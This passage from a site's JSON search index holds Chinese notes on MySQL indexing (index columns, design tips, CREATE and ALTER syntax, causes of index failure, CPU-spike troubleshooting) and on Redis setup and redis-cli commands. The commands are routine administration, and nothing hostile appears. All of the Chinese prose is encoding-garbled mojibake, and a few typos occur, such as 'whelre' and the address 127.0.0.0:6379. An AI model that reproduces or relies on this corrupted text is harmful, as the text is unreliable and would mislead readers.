è¿™äº›éƒ½è‡ªåŠ¨ä¼šç”Ÿæˆç´¢å¼•ï¼Œè‡³äºå¤–é”®å¤§å®¶å¯ä»¥å»å°è¯•ä¸‹ æ³¨è§£ ä¸Šè¡¨æ ¼ä¸­å„ä¸ªåˆ—çš„è¯´æ˜: table #è¡¨åç§° non_unique #å¦‚æœç´¢å¼•ä¸èƒ½åŒ…æ‹¬é‡å¤è¯ï¼Œä¸º0ï¼Œå¦‚æœå¯ä»¥ï¼Œåˆ™ä¸º1 key_name #ç´¢å¼•çš„åç§° seq_in_index #ç´¢å¼•ä¸­çš„åˆ—åºå· column_name #åˆ—åç§° collation #åˆ—ä»¥ä»€ä¹ˆæ–¹å¼å­˜å‚¨åœ¨ç´¢å¼•ä¸­ï¼Œåœ¨mysqlä¸­ï¼Œæœ‰å€¼'A'ï¼ˆå‡åºï¼‰æˆ–è€…NULLï¼ˆæ— åˆ†ç±»ï¼‰ cardinality #ç´¢å¼•åœ¨å”¯ä¸€å€¼çš„æ•°æ®çš„ä¼°å€¼ï¼Œé€šè¿‡è¿è¡Œanalyze table xxx_table;æˆ–è€… myisamchk -a å¯ä»¥æ›´æ–°ï¼ŒæŠ€æœ¯æ ¹æ®è¢«å­˜å‚¨ä¸ºæ•´æ•°çš„ç»Ÿè®¡æ•°æ®æ¥è®¡æ•°ï¼Œæ‰€ä»¥å³ä½¿å¯¹äºå°å‹è¡¨ï¼Œè¯¥å€¼ä¹Ÿæ²¡å¿…è¦æ˜¯ç²¾ç¡®çš„ï¼ŒåŸºæ•°è¶Šå¤§ï¼Œå½“è¿›è¡Œè”åˆæ‰€é¥®é£Ÿï¼Œmysqlä½¿ç”¨è¯¥ç´¢å¼•çš„æœºä¼šè¶Šå¤§ã€‚myisamä¸­ï¼Œè¯¥å€¼æ˜¯å‡†ç¡®çš„ï¼ŒINNODBä¸­è¯¥å€¼æ•°æ®æ˜¯ä¼°ç®—çš„ï¼Œå­˜åœ¨åå·® sub_part #å¦‚æœåˆ—åªæ˜¯éƒ¨åˆ†çš„ç¼–å…¥ç´¢å¼• åˆ™ä¸ºè¢«ç¼–å…¥ç´¢å¼•çš„å­—ç¬¦çš„æ•°ç›®ï¼Œå¦‚æœæ•´åˆ—è¢«ç¼–å…¥ç´¢å¼•ï¼Œåˆ™ä¸ºNULL packed #æŒ‡ç¤ºå…³é”®è¯å¦‚ä½•è¢«å‹ç¼©ï¼Œå¦‚æœæ²¡æœ‰è¢«å‹ç¼©ï¼Œåˆ™ä¸ºNULL NULL #å¦‚æœåˆ—å«æœ‰NULLï¼Œåˆ™å«æœ‰YESï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™è¯¥åˆ—ä¸ºNO index_type #ç”¨è¿‡çš„ç´¢å¼•æ–¹æ³•ï¼ˆBTREE,FULLTEXT,HASH,RTREEï¼‰ comment #å¤‡æ³¨ index_comment #ä¸ºç´¢å¼•åˆ›å»ºæ—¶æä¾›äº†ä¸€ä¸ªæ³¨é‡Šå±æ€§çš„ç´¢å¼•çš„ä»»ä½•è¯„è®º åˆ›å»ºç´¢å¼•æ³¨æ„ç‚¹ ç´¢å¼•åº”è¯¥å»ºåœ¨æŸ¥è¯¢åº”ç”¨é¢‘ç¹çš„å­—æ®µï¼Œæ¯”å¦‚whelreåˆ¤æ–­ã€order æ’åºå’Œjoin çš„ï¼ˆonï¼‰å­—æ®µä¸Šåˆ›å»ºç´¢å¼•ã€‚ ç´¢å¼•çš„ä¸ªæ•°åº”è¯¥é€‚é‡ï¼Œç´¢å¼•éœ€è¦å ç”¨ç©ºé—´ï¼Œæ›´æ–°æ—¶å€™ä¹Ÿéœ€è¦ç»´æŠ¤; ä¸€ä¸ªè¡¨ä¸­å¦‚æœæœ‰å¤§é‡çš„ç´¢å¼•ï¼Œä¸ä»…å ç”¨ç£ç›˜ç©ºé—´ï¼Œè€Œä¸”ä¼šå½±å“INSERTã€DELETEã€UPDATEç­‰è¯­å¥çš„æ€§èƒ½ï¼Œ å› ä¸ºåœ¨è¡¨ä¸­çš„æ•°æ®æ›´æ”¹çš„åŒæ—¶ï¼Œç´¢å¼•ä¹Ÿä¼šè¿›è¡Œè°ƒæ•´å’Œæ›´æ–°; åŒºåˆ†åº¦ä½çš„å­—æ®µï¼Œä¾‹å¦‚æ€§åˆ«ï¼Œä¸è¦å»ºç´¢å¼•ã€‚ é¢‘ç¹æ›´æ–°çš„å€¼ï¼Œä¸è¦ä½œä¸ºç´¢å¼•ï¼Œç»´æŠ¤ç´¢å¼•æ–‡ä»¶éœ€è¦æˆæœ¬ï¼›è¿˜ä¼šå¯¼è‡´é¡µåˆ†è£‚ï¼ŒI0æ¬¡æ•°å¢å¤šã€‚ è”åˆç´¢å¼•æŠŠæ•£åˆ—æ€§é«˜ï¼ˆåŒºåˆ†åº¦é«˜ï¼‰çš„å€¼æ”¾åœ¨å‰é¢ä¸ºäº†æ›´å¥½çš„æ»¡è¶³æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ å°½å¯èƒ½ç”¨è”åˆç´¢å¼•ä»£æ›¿å¤šä¸ªå•åˆ—ç´¢å¼• ï¼ˆå¯¹äºå•åˆ—ç´¢å¼•ï¼ŒMySQLåŸºæœ¬åªèƒ½ä½¿ç”¨ä¸€ä¸ªç´¢å¼•ï¼Œæ‰€ä»¥ç»å¸¸ä½¿ç”¨å¤šä¸ªæ¡ä»¶æŸ¥è¯¢æ—¶æ›´é€‚åˆä½¿ç”¨è”åˆç´¢å¼•ï¼‰ è¿‡é•¿çš„å­—æ®µï¼Œä½¿ç”¨å‰ç¼€ç´¢å¼•ã€‚å½“å­—æ®µå€¼æ¯”è¾ƒé•¿çš„æ—¶å€™ï¼Œå»ºç«‹ç´¢å¼•ä¼šæ¶ˆè€—å¾ˆå¤šçš„ç©ºé—´ï¼Œæœç´¢èµ·æ¥ä¹Ÿä¼šå¾ˆæ…¢ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡æˆªå–å­—æ®µçš„å‰é¢ä¸€éƒ¨åˆ†å†…å®¹å»ºç«‹ç´¢å¼•ï¼Œè¿™ä¸ªå°±å«å‰ç¼€ç´¢å¼•ã€‚ ä¸å»ºè®®ç”¨æ— åºçš„å€¼ï¼ˆä¾‹å¦‚èº«ä»½è¯ã€UUIDï¼‰ä½œä¸ºç´¢å¼•ï¼Œåœ¨æ’å…¥æ—¶ä¼šé€ æˆå¶å­èŠ‚ç‚¹é¢‘ç¹åˆ†è£‚ï¼Œå‡ºç°ç£ç›˜å­˜å‚¨çš„ç¢ç‰‡åŒ– æ•°æ®é‡å°çš„è¡¨æœ€å¥½ä¸è¦ä½¿ç”¨ç´¢å¼•ï¼Œç”±äºæ•°æ®è¾ƒå°‘ï¼ŒæŸ¥è¯¢èŠ±è´¹çš„æ—¶é—´å¯èƒ½æ¯”éå†ç´¢å¼•çš„æ—¶é—´è¿˜è¦çŸ­ï¼Œç´¢å¼•å¯èƒ½ä¸ä¼šäº§ç”Ÿä¼˜åŒ–æ•ˆæœ; å½“å”¯ä¸€æ€§æ˜¯æŸç§æ•°æ®æœ¬èº«çš„ç‰¹å¾æ—¶(æ¯”å¦‚ä¸‹å•æ—¥æœŸå¯ä»¥)ï¼ŒæŒ‡å®šå”¯ä¸€ç´¢å¼•ã€‚ä½¿ç”¨å”¯ä¸€ç´¢å¼•éœ€èƒ½ç¡®ä¿å®šä¹‰çš„åˆ—çš„æ•°æ®å®Œæ•´æ€§ï¼Œä»¥æé«˜æŸ¥è¯¢é€Ÿåº¦; æœç´¢çš„ç´¢å¼•åˆ—ï¼Œä¸ä¸€å®šæ˜¯æ‰€è¦é€‰æ‹©çš„åˆ—; æ¢å¥è¯è¯´ï¼Œæœ€é€‚åˆç´¢å¼•çš„åˆ—æ˜¯å‡ºç°åœ¨WHEREå­å¥ä¸­çš„åˆ—ï¼Œæˆ–è¿æ¥å­å¥ä¸­æŒ‡å®šçš„åˆ—ï¼Œè€Œä¸æ˜¯å‡ºç°åœ¨SELECTå…³é”®å­—åçš„é€‰æ‹©åˆ—è¡¨ä¸­çš„åˆ—; ä½¿ç”¨çŸ­ç´¢å¼•; å¦‚æœå¯¹å­—ç¬¦ä¸²åˆ—è¿›è¡Œç´¢å¼•ï¼Œåº”è¯¥æŒ‡å®šä¸€ä¸ªå‰ç¼€é•¿åº¦ï¼Œåªè¦æœ‰å¯èƒ½å°±åº”è¯¥è¿™æ ·åš; ä¾‹å¦‚ï¼Œæœ‰ä¸€ä¸ªCHAR(200)åˆ—ï¼Œå¦‚æœåœ¨å‰10ä¸ªæˆ–20ä¸ªå­—ç¬¦å†…ï¼Œå¤šæ•°å€¼æ˜¯å”¯ä¸€çš„ï¼Œé‚£ä¹ˆå°±ä¸è¦å¯¹æ•´ä¸ªåˆ—è¿›è¡Œç´¢å¼•; å¯¹å‰10ä¸ªæˆ–20ä¸ªå­—ç¬¦è¿›è¡Œç´¢å¼•èƒ½å¤ŸèŠ‚çœå¤§é‡ç´¢å¼•ç©ºé—´ï¼Œä¹Ÿå¯èƒ½ä¼šä½¿æŸ¥è¯¢æ›´å¿«; è¾ƒå°çš„ç´¢å¼•æ¶‰åŠçš„ç£ç›˜ IO è¾ƒå°‘ï¼Œè¾ƒçŸ­çš„å€¼æ¯”è¾ƒèµ·æ¥æ›´å¿«; æ›´ä¸ºé‡è¦çš„æ˜¯ï¼Œå¯¹äºè¾ƒçŸ­çš„é”®å€¼ï¼Œç´¢å¼•é«˜é€Ÿç¼“å­˜ä¸­çš„å—èƒ½å®¹çº³æ›´å¤šçš„é”®å€¼ï¼Œ å› æ­¤ï¼ŒMySQL ä¹Ÿå¯ä»¥åœ¨å†…å­˜ä¸­å®¹çº³æ›´å¤šçš„å€¼ã€‚è¿™æ ·å°±å¢åŠ äº†æ‰¾åˆ°è¡Œè€Œä¸ç”¨è¯»å–ç´¢å¼•ä¸­è¾ƒå¤šå—çš„å¯èƒ½æ€§; å¯¹äºInnoDBå­˜å‚¨å¼•æ“çš„è¡¨ï¼Œè®°å½•é»˜è®¤ä¼šæŒ‰ç…§ä¸€å®šçš„é¡ºåºä¿å­˜; å¦‚æœæœ‰æ˜ç¡®å®šä¹‰çš„ä¸»é”®ï¼Œåˆ™æŒ‰ç…§ä¸»é”®é¡ºåºä¿å­˜; å¦‚æœæ²¡æœ‰ä¸»é”®ï¼Œä½†æ˜¯æœ‰å”¯ä¸€ç´¢å¼•ï¼Œé‚£ä¹ˆå°±æ˜¯æŒ‰ç…§å”¯ä¸€ç´¢å¼•çš„é¡ºåºä¿å­˜; å¦‚æœæ—¢æ²¡æœ‰ä¸»é”®åˆæ²¡æœ‰å”¯ä¸€ç´¢å¼•ï¼Œé‚£ä¹ˆè¡¨ä¸­ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå†…éƒ¨åˆ—ï¼ŒæŒ‰ç…§è¿™ä¸ªåˆ—çš„é¡ºåºä¿å­˜; æŒ‰ç…§ä¸»é”®æˆ–è€…å†…éƒ¨åˆ—è¿›è¡Œçš„è®¿é—®æ˜¯æœ€å¿«çš„ï¼Œæ‰€ä»¥InnoDBè¡¨å°½é‡è‡ªå·±æŒ‡å®šä¸»é”®ï¼Œ å½“è¡¨ä¸­åŒæ—¶æœ‰å‡ ä¸ªåˆ—éƒ½æ˜¯å”¯ä¸€çš„ï¼Œéƒ½å¯ä»¥ä½œä¸ºä¸»é”®çš„æ—¶å€™ï¼Œ è¦é€‰æ‹©æœ€å¸¸ä½œä¸ºè®¿é—®æ¡ä»¶çš„åˆ—ä½œä¸ºä¸»é”®ï¼Œæé«˜æŸ¥è¯¢çš„æ•ˆç‡; å¦å¤–ï¼Œè¿˜éœ€è¦æ³¨æ„ï¼ŒInnoDB è¡¨çš„æ™®é€šç´¢å¼•éƒ½ä¼šä¿å­˜ä¸»é”®çš„é”®å€¼ï¼Œ æ‰€ä»¥ä¸»é”®è¦å°½å¯èƒ½é€‰æ‹©è¾ƒçŸ­çš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å‡å°‘ç´¢å¼•çš„ç£ç›˜å ç”¨ï¼Œæé«˜ç´¢å¼•çš„ç¼“å­˜æ•ˆæœ åˆ›å»ºç´¢å¼• æ˜¾ç¤ºç´¢å¼•ä¿¡æ¯: # SHOW INDEX å‘½ä»¤ mysql> SHOW INDEX FROM table_name\\G å‡ ç§æ–¹å¼é€šè¿‡ä¿®æ”¹è¡¨ç»“æ„å¢åŠ ç´¢å¼•: # æ·»åŠ ä¸€ä¸ªä¸»é”®ï¼Œè¿™æ„å‘³ç€ç´¢å¼•å€¼å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œä¸”ä¸èƒ½ä¸ºNULL ALTER TABLE tbl_name ADD PRIMARY KEY (column_list); # åˆ›å»ºç´¢å¼•çš„å€¼å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼ˆé™¤äº†NULLå¤–ï¼ŒNULLå¯èƒ½ä¼šå‡ºç°å¤šæ¬¡ï¼‰ ALTER TABLE tbl_name ADD UNIQUE index_name (column_list); # æ·»åŠ æ™®é€šç´¢å¼•ï¼Œç´¢å¼•å€¼å¯å‡ºç°å¤šæ¬¡ ALTER TABLE tbl_name ADD INDEX index_name (column_list); # æŒ‡å®šäº†ç´¢å¼•ä¸º FULLTEXT ï¼Œç”¨äºå…¨æ–‡ç´¢å¼• ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list) ä½¿ç”¨ ALTER å‘½ä»¤æ·»åŠ å’Œåˆ é™¤ä¸»é”®: mysql> ALTER TABLE testalter_tbl MODIFY i INT NOT NULL; mysql> ALTER TABLE testalter_tbl ADD PRIMARY KEY (i); # åˆ é™¤ä¸»é”®æ—¶åªéœ€æŒ‡å®šPRIMARY KEYï¼Œä½†åœ¨åˆ é™¤ç´¢å¼•æ—¶ï¼Œä½ å¿…é¡»çŸ¥é“ç´¢å¼•åã€‚ mysql> ALTER TABLE testalter_tbl DROP PRIMARY KEY; æ™®é€šç´¢å¼• è¿™æ˜¯æœ€åŸºæœ¬çš„ç´¢å¼•ï¼Œå®ƒæ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚å®ƒæœ‰ä»¥ä¸‹å‡ ç§åˆ›å»ºæ–¹å¼: CREATE INDEX indexName ON table_name (column_name) å¦‚æœæ˜¯CHARï¼ŒVARCHARç±»å‹ï¼Œlengthå¯ä»¥å°äºå­—æ®µå®é™…é•¿åº¦ï¼› å¦‚æœæ˜¯BLOBå’ŒTEXTç±»å‹ï¼Œå¿…é¡»æŒ‡å®š lengthã€‚ ä¿®æ”¹è¡¨ç»“æ„(æ·»åŠ ç´¢å¼•): ALTER table tableName ADD INDEX indexName(columnName) åˆ›å»ºè¡¨çš„æ—¶å€™ç›´æ¥æŒ‡å®š: CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, INDEX [indexName] (username(length)) ); åˆ é™¤ç´¢å¼•çš„è¯­æ³•: DROP INDEX [indexName] ON mytable; å”¯ä¸€ç´¢å¼• åˆ›å»º: CREATE UNIQUE INDEX indexName ON mytable(username(length)) ä¿®æ”¹è¡¨ç»“æ„: ALTER table mytable ADD UNIQUE [indexName] (username(length)) åˆ›å»ºè¡¨çš„æ—¶å€™ç›´æ¥æŒ‡å®š: CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, UNIQUE [indexName] (username(length)) ); ç´¢å¼•å¤±æ•ˆ æŸ¥è¯¢æ¡ä»¶åŒ…å«orï¼Œå¯èƒ½å¯¼è‡´ç´¢å¼•å¤±æ•ˆ å¦‚æœå­—æ®µç±»å‹æ˜¯å­—ç¬¦ä¸²ï¼Œwhereæ—¶ä¸€å®šç”¨å¼•å·æ‹¬èµ·æ¥ï¼Œå¦åˆ™ä¼šå› ä¸ºéšå¼ç±»å‹è½¬æ¢ï¼Œç´¢å¼•å¤±æ•ˆ likeé€šé…ç¬¦å¯èƒ½å¯¼è‡´ç´¢å¼•å¤±æ•ˆã€‚ è”åˆç´¢å¼•ï¼ŒæŸ¥è¯¢æ—¶çš„æ¡ä»¶åˆ—ä¸æ˜¯è”åˆç´¢å¼•ä¸­çš„ç¬¬ä¸€ä¸ªåˆ—ï¼Œç´¢å¼•å¤±æ•ˆã€‚ åœ¨ç´¢å¼•åˆ—ä¸Šä½¿ç”¨mysqlçš„å†…ç½®å‡½æ•°ï¼Œç´¢å¼•å¤±æ•ˆã€‚ å¯¹ç´¢å¼•åˆ—è¿ç®—ï¼ˆå¦‚ï¼Œ+ã€ä¸€ã€ * 1ï¼Œç´¢å¼•å¤±æ•ˆã€‚ ç´¢å¼•å­—æ®µä¸Šä½¿ç”¨ï¼ˆï¼=æˆ–è€…<>ï¼Œnot inï¼‰æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆã€‚ ç´¢å¼•å­—æ®µä¸Šä½¿ç”¨is nullï¼Œis not nullï¼Œå¯èƒ½å¯¼è‡´ç´¢å¼•å¤±æ•ˆã€‚ å·¦è¿æ¥æŸ¥è¯¢æˆ–è€…å³è¿æ¥æŸ¥è¯¢æŸ¥è¯¢å…³è”çš„å­—æ®µç¼–ç æ ¼å¼ä¸ä¸€æ ·ï¼Œå¯èƒ½å¯¼è‡´ç´¢å¼•å¤±æ•ˆã€‚ MySQLä¼˜åŒ–å™¨ä¼°è®¡ä½¿ç”¨å…¨è¡¨æ‰«æè¦æ¯”ä½¿ç”¨ç´¢å¼•å¿«ï¼Œåˆ™ä¸ä½¿ç”¨ç´¢å¼•ã€‚","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-index.html","loc":"/yq-doc-source-docs-database-mysql-index.html"},{"title":"å…¶ä»–é—®é¢˜","text":"è”åˆç´¢å¼•çš„å®ç° æŒ‰ç…§æ¯ä¸€ä¸ªç´¢å¼•çš„é¡ºåºæ¥è¿›è¡Œæ’åº, å¦‚ (A, B, C) , å…ˆæŒ‰Aæ’åº, Aç›¸ç­‰å°±çœ‹B, è¦æ˜¯ABCéƒ½ç›¸ç­‰, å°±çœ‹ä¸»é”® åˆ›å»ºè”åˆç´¢å¼•: KEY `idx_name_age_position` (`name`, `age`, `position`) USING BTREE å¦‚ä½•æŸ¥è¯¢SQLæ‰§è¡Œè®¡åˆ’ EXPLAIN åŠ  æ•°æ®åº“è¯­å¥ ä¸€äº›åŸåˆ™ é«˜å¹¶å‘åœºæ™¯ä¸‹, æ•°æ®åº“å°½é‡ä¸è¦å¤šè¡¨å…³è”, æ¯”å¦‚é˜¿é‡Œå°±ç¦æ­¢è¶…è¿‡ä¸‰å¼ è¡¨çš„JOIN å› ä¸ºä¼šé™ä½DBæ€§èƒ½ å¯¹äºé«˜å¹¶å‘æ¥è¯´, DBå¡æ­», åŸºæœ¬ä¸Šä¾èµ–è¿™ä¸ªDBçš„éƒ½ä¼šè¢«å½±å“, å¤§éƒ¨åˆ†éƒ½æ˜¯é‡‡å–, å°†æ•°æ®çš„æ•´åˆè½¬ç§»åˆ°WEBåº”ç”¨ä¸Šå», å› ä¸ºWEBæœ‰ç“¶é¢ˆäº†, æ‰©å®¹WEBå°±è¡Œç­‰... binlog å¯ä»¥å¼€å¯binlogæ—¥å¿—, å¯ä»¥è®°å½•å¯¹æ•°æ®åº“çš„å¢åˆ æ”¹æ“ä½œ. åˆ åº“è·‘è·¯å•¥çš„, æœ‰binlogå¯ä»¥å°è¯•æ¢å¤. æ•°æ®åº“CPUé£™å‡ æ’æŸ¥è¿‡ç¨‹ ä½¿ç”¨top å‘½ä»¤è§‚å¯Ÿï¼Œç¡®å®šæ˜¯ mysqld å¯¼è‡´è¿˜æ˜¯å…¶ä»–åŸå› ã€‚ å¦‚æœæ˜¯ mysqld å¯¼è‡´çš„ï¼Œshow processlistï¼ŒæŸ¥çœ‹ session æƒ…å†µï¼Œç¡®å®šæ˜¯ä¸æ˜¯æœ‰æ¶ˆè€—èµ„æºçš„ sql åœ¨è¿è¡Œã€‚ æ‰¾å‡ºæ¶ˆè€—é«˜çš„sqlï¼Œçœ‹çœ‹æ‰§è¡Œè®¡åˆ’æ˜¯å¦å‡†ç¡®ï¼Œç´¢å¼•æ˜¯å¦ç¼ºå¤±ï¼Œæ•°æ®é‡æ˜¯å¦å¤ªå¤§ã€‚ å¤„ç† killæ‰è¿™äº›çº¿ç¨‹ï¼ˆåŒæ—¶è§‚å¯Ÿ cpu ä½¿ç”¨ç‡æ˜¯å¦ä¸‹é™ï¼‰ï¼Œ è¿›è¡Œç›¸åº”çš„è°ƒæ•´ï¼ˆæ¯”å¦‚è¯´åŠ ç´¢å¼•ã€æ”¹sqã€æ”¹å†…å­˜å‚æ•°ï¼‰ é‡æ–°è·‘è¿™äº› SQLã€‚ å…¶ä»–æƒ…å†µ ä¹Ÿæœ‰å¯èƒ½æ˜¯æ¯ä¸ª sq|æ¶ˆè€—èµ„æºå¹¶ä¸å¤šï¼Œä½†æ˜¯çªç„¶ä¹‹é—´ï¼Œæœ‰å¤§é‡çš„ session è¿è¿›æ¥å¯¼è‡´cpu é£™å‡ï¼Œ è¿™ç§æƒ…å†µå°±éœ€è¦è·Ÿåº”ç”¨ä¸€èµ·æ¥åˆ†æä¸ºä½•è¿æ¥æ•°ä¼šæ¿€å¢ï¼Œå†åšå‡ºç›¸åº”çš„è°ƒæ•´ï¼Œæ¯”å¦‚è¯´é™åˆ¶è¿æ¥æ•°ç­‰ã€‚ Gå’Œgä½œç”¨ å…¶å®æ˜¯: \\g å’Œ \\G \\g è¡¨ç¤ºåœ¨MySQLçš„sqlè¯­å¥ååŠ ä¸Š \\g ï¼Œæ•ˆæœç­‰åŒäºåŠ ä¸Šå®šç•Œç¬¦ï¼Œä¸€èˆ¬é»˜è®¤çš„å®šç•Œç¬¦æ˜¯åˆ†å·; å¯ä»¥å…¼å®¹ç‰¹æ„ä¿®æ”¹äº†å®šç•Œç¬¦çš„æƒ…å†µ; \\G åœ¨MySQLçš„sqlè¯­å¥ååŠ ä¸Š \\G ï¼Œè¡¨ç¤ºå°†æŸ¥è¯¢ç»“æœè¿›è¡ŒæŒ‰åˆ—æ‰“å°ï¼Œå¯ä»¥ä½¿æ¯ä¸ªå­—æ®µæ‰“å°åˆ°å•ç‹¬çš„è¡Œã€‚ å› ä¸ºå¦‚æœä¸è¿™æ ·, æœ‰äº›è¡¨åˆ—å¾ˆå¤š, ä¼šæœ‰æŠ˜è¡Œ, é˜…è¯»ä¸å‹å¥½.","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-other-problems.html","loc":"/yq-doc-source-docs-database-mysql-other-problems.html"},{"title":"é‡åˆ°è¿‡çš„é—®é¢˜","text":"connection 127.0.0.0:6379 refused è¿æ¥æœ¬åœ°redisæœåŠ¡ç«¯å¤±è´¥ æŸ¥åˆ°çš„ä¸»è¦å°±æ˜¯æœåŠ¡ç«¯æ²¡æœ‰å¯åŠ¨æˆåŠŸ å¯èƒ½æ˜¯bind è¿˜éœ€è¦ç»‘å®šæœ¬æœºip: bind 127.0.0.1,$ip ä¹Ÿå¯èƒ½æ˜¯éœ€è¦å¼€å§‹è‡ªåŠ¨åå°è¿è¡Œï¼šdaemonizeï¼ˆå®ˆæŠ¤è¿›ç¨‹ï¼‰: daemonize yes aofæ–‡ä»¶ï¼šè®°å½•redisæ•°æ®çš„å˜åŠ¨æƒ…å†µ å¦‚æœæ˜¯å®•æœºï¼Œå¯èƒ½æ˜¯aofï¼ˆappend only fileï¼‰æ–‡ä»¶å­˜åœ¨é”™è¯¯å¯¼è‡´redis-serveræ²¡æœ‰å¯åŠ¨æˆåŠŸ éœ€è¦æ‰§è¡Œ: # è¯¢é—®æ˜¯å¦ä¿®å¤ï¼ˆäº¤äº’å‘½ä»¤ï¼‰ redis-check-aof --fix aofæ–‡ä»¶å # æŠ¥å‘Šaofæ–‡ä»¶é”™è¯¯ redis-check-aof aofæ–‡ä»¶å","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-redis-I-have-encountered-problems.html","loc":"/yq-doc-source-docs-database-redis-I-have-encountered-problems.html"},{"title":"redis","text":"Redis å¸¸ç”¨äº”å¤§æ•°æ®ç±»å‹: String List (æ¯”å¦‚æ¶ˆæ¯é˜Ÿåˆ—) Set (æ¯”å¦‚å…³æ³¨åˆ—è¡¨) Hash (å¤æ‚æœ€æƒ³å­˜å‚¨) Zsetï¼ˆæœ‰åºé›†åˆï¼‰SortSet (æ¯”å¦‚æ’è¡Œæ¦œ) aofæ–‡ä»¶ï¼šè®°å½•redisæ•°æ®çš„å˜åŠ¨æƒ…å†µ æ³¨è§£ redisçš„keyæ”¯æŒè®¾ç½®è¿‡æœŸç­–ç•¥. æŒ‰ç…§æ€§èƒ½åˆ†ç±» å•æœº ä¸»ä» é«˜å¯ç”¨ (Redisé›†ç¾¤) å¾…çœ‹: ç¾å›¢ä¸‡äº¿çº§ KV å­˜å‚¨æ¶æ„ä¸å®è·µ é˜¿é‡Œäº‘Redis å¥½å¤„? è·ç¦», ç”µå•†ä¸ºä»€ä¹ˆä¼šç”¨redisåšæ¶ˆæ¯ç³»ç»Ÿï¼Œå¾®æœåŠ¡ä¸‹çš„é«˜å¹¶å‘æ¶æ„ (ä½œä¸ºæ¶ˆæ¯ä¸­å¿ƒ, ç”Ÿäº§è€…æ¶ˆè´¹è€…ä¸­ä»‹) å•æœºå°±èƒ½æ”¯æŒ10wå¹¶å‘(æ ‡å‡†8æ ¸16G) docker éƒ¨ç½² å…ˆå» rediså®˜ç½‘ ä¸‹è½½ä¸€ä¸ªé…ç½®æ–‡ä»¶, å› ä¸ºå®˜æ–¹dockeré•œåƒå†…æ²¡æœ‰ æŒ‰éœ€ä¿®æ”¹é…ç½®æ–‡ä»¶, æ³¨æ„é»˜è®¤ä¸è®¾ç½®å®ˆæŠ¤çº¿ç¨‹: daemonize no è¿™ä¸ªä¸è¦æ”¹, æ”¹äº†dockerå¯åŠ¨ä¸äº†... å¯åŠ¨: docker run --name myredis -p 6379:6379 -d \\ -v /Users/yanque/project/code/moment-management/src/conf:/usr/local/etc/redis \\ redis redis-server /usr/local/etc/redis/redis.conf redis-server /usr/local/etc/redis/redis.conf è¡¨ç¤ºä½¿ç”¨æ­¤é…ç½®æ–‡ä»¶. ä¹Ÿå¯ä»¥åé¢è¿›å…¥shellæ‰‹åŠ¨æ‰§è¡Œ","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-redis-redis.html","loc":"/yq-doc-source-docs-database-redis-redis.html"},{"title":"ä½¿ç”¨","text":"ç›¸å…³å‘½ä»¤ redis-benchmark redisæ€§èƒ½æµ‹è¯• redis-check-aof æ ¡éªŒaofæ–‡ä»¶å®Œæ•´æ€§ redis-check-rdb æ£€æŸ¥rdb redis-cli å‘½ä»¤è¡Œäº¤äº’å¼æ‰“å¼€ä½¿ç”¨ redis-sentinel å“¨å…µ, ä¸æœåŠ¡æ˜¯ä¸€ä¸ª redis-server æœåŠ¡. å¯åŠ¨rediså¯ä»¥ä½¿ç”¨: redis-server [conf-file] dockerå®‰è£…çš„redisç»“æ„ redis-cliäº¤äº’æŒ‡ä»¤ redis-cli -h ä¸»æœº -p ç«¯å£ -a å¯†ç  --raw å½“è¾“å‡ºç»“æœæœ‰ä¸­æ–‡çš„æ—¶å€™, é»˜è®¤è¾“å‡ºæ˜¯16è¿›åˆ¶, åŠ æ­¤é€‰é¡¹, è§£ç ä¸ºä¸­æ–‡æ˜¾ç¤º ä¹Ÿå¯ä»¥ç›´æ¥è·Ÿåœ¨redis-cliåé¢ç›´æ¥æ‰§è¡Œ: redis-cli --raw get $key å…³é—­redis: redis shutdown ä¸å»ºè®®ç›´æ¥kill, ä¼šä¸¢å¤±å†…å­˜æ•°æ® äº¤äº’å¼æ“ä½œ dbsize æŸ¥çœ‹å½“å‰å­˜å‚¨çš„keyæ•°é‡ keys æŸ¥çœ‹æ‰€æœ‰key: keys * flushdb æ¸…ç©ºå½“å‰ä¼šè¯çš„æ•°æ® auth è´¦æˆ·éªŒè¯ç™»é™† type æŸ¥çœ‹æŒ‡å®škeyæ•°æ®ç±»å‹ object encoding æŸ¥çœ‹keyå¯¹åº”æ•°æ®åº•å±‚ç»“æ„. å¦‚: object encoding $key Stringæ“ä½œ set è®¾ç½®key-value è¯­æ³•: set key value [EX seconds|PX milliseconds|EXAT timestamp|PXAT milliseconds-timestamp|KEEPTTL] [NX|XX] [GET] å‚æ•°é€‰é¡¹è¯´æ˜ key è®¾ç½®çš„é”®å value é”®å¯¹åº”çš„å€¼ EX seconds å¯é€‰å‚æ•°ï¼Œè¿‡æœŸæ—¶é—´, å•ä½ç§’ PX milliseconds å¯é€‰å‚æ•°ï¼Œè¿‡æœŸæ—¶é—´, å•ä½æ¯«ç§’, ä¸EXäºŒé€‰ä¸€å³å¯ EXAT timestamp å¯é€‰å‚æ•°ï¼Œæ—¶é—´æˆ³ PXAT milliseconds-timestamp å¯é€‰å‚æ•°ï¼Œæ¯«ç§’çº§æ—¶é—´æˆ³ KEEPTTL å¯é€‰å‚æ•°ï¼Œä¿æŒé”®çš„ç°æœ‰è¿‡æœŸæ—¶é—´ä¸å˜ã€‚ NX å¯é€‰å‚æ•°ï¼Œå¦‚æœè¦è®¾ç½®çš„keyä¸å­˜åœ¨æ‰è®¾ç½®, ä»…ä½¿ç”¨æ­¤é€‰é¡¹, ä¸ setnx æ•ˆæœä¸€è‡´ XX å¯é€‰å‚æ•°ï¼Œä»…åœ¨é”®å·²å­˜åœ¨æ—¶è®¾ç½®é”®çš„å€¼ï¼ˆå³æ‰§è¡Œ \"SET IF EXISTS\" æ“ä½œï¼‰ã€‚ GET 